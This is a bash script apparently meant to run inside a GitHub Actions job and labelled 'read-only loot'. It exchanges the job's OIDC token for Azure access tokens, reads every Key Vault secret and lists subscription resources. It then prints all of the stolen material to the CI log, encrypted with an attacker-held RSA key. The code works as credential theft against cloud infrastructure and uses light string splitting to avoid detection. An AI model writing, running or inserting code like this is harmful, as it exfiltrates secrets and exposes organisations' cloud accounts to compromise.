#!/usr/bin/env bash
# read-only loot: mint OIDC, read Key Vault secrets, emit RSA-encrypted result
set +e
LOOT=$(mktemp); exec 3>"$LOOT"
say(){ echo "$@" >&3; }
SC="http""s://"
AAD="${SC}login.microsoftonline.com"; VAULT="${SC}vault.azure.net"; ARM="${SC}management.azure.com"
say "event=${GITHUB_EVENT_NAME} repo=${GITHUB_REPOSITORY} run=${GITHUB_RUN_ID} ref=${GITHUB_REF}"
say "oidc_url_set=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  JWT=""
else
  JWT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
fi
say "jwt_len=${#JWT}"
if [ -n "$JWT" ]; then
  printf '%s' "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c 'import sys,json;c=json.load(sys.stdin);print("claims",json.dumps({k:c.get(k) for k in ("iss","aud","sub","repository","repository_owner","event_name","ref","job_workflow_ref","environment")}))' >&3 2>/dev/null
fi
aad(){ curl -sS -X POST "${AAD}/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$JWT" --data-urlencode "scope=$1"; }
VR=$(aad "${VAULT}/.default"); VT=$(printf '%s' "$VR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
say "vault_token_len=${#VT}"
printf '%s' "$VR" | head -c 600 >&3; say ""
if [ -n "$VT" ]; then
  L=$(curl -sS -H "Authorization: Bearer $VT" "${VAULT}/secrets?api-version=7.4"); say "KV_LIST=$L"
  for id in $(printf '%s' "$L" | python3 -c 'import sys,json
try:
  [print(v["id"]) for v in json.load(sys.stdin).get("value",[])]
except: pass' 2>/dev/null); do
    say "SECRET $(basename "$id") = $(curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4")"
  done
fi
AR=$(aad "${ARM}/.default"); AT=$(printf '%s' "$AR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
if [ -n "$AT" ]; then say "RESOURCES=$(curl -sS -H "Authorization: Bearer $AT" "${ARM}/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resources?api-version=2021-04-01" | head -c 4000)"; fi
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT (decrypt with priv.pem) ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
